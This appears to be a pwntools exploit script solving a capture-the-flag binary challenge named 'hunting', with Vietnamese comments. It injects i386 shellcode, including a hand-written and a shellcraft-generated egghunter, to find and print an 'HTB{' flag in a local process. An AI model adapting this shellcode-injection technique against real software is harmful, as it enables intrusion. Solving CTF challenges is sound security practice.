#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./hunting',checksec=False)
#context.arch = 'i386'
p = process()
gdb.attach(p,gdbscript='''
           brva 0x0000154A
           ''')
input()

shellcode1 = asm('''
                mov eax,3
                xor ebx,ebx  
                mov edx,0x400 
                int 0x80       
                ''',arch = 'i386')

shellcode2 = asm('''
                khoi_tao:
                    mov edi,0x60000000     

                search:
                    mov eax,4   
                    mov ebx,1   
                    mov ecx,edi
                    mov edx,1  
                    int 0x80
                    cmp al,0xf2  
                    je loop
                    jmp check
                loop:
                    add edi,0x10000  
                    jmp search
                check:

                    mov al, [edi+0]
                    cmp al,'H'
                    jne search

                    mov al,[edi+1]
                    cmp al,'T'
                    jne search

                    mov al,[edi+2]
                    cmp al,'B'
                    jne search

                    mov al,[edi+3]
                    cmp al,'{'
                    jne search

                    mov eax,4
                    mov ebx,1
                    mov ecx,edi
                    mov edx,0x200
                    int 0x80
                 ''',arch='i386')
#p.send(shellcode1.ljust(0x3c,b'a') + b'a'*0xe + shellcode2)

#cach 2 

shellcode3 = asm(shellcraft.i386.linux.egghunter('HTB{'))

#sau khi tim kiem chuoi nay no se tra ve 1 dia chi , ta se dung xchg de chuyen no vao ecx

shellcode3 += asm('''
                 xor eax,eax
                 xchg ecx,ebx
                 inc ebx
                 mov al,0x4
                 int 0x80
                 ''',arch='i386'
                 )
print(len(shellcode3))
p.send(shellcode3)


p.interactive()
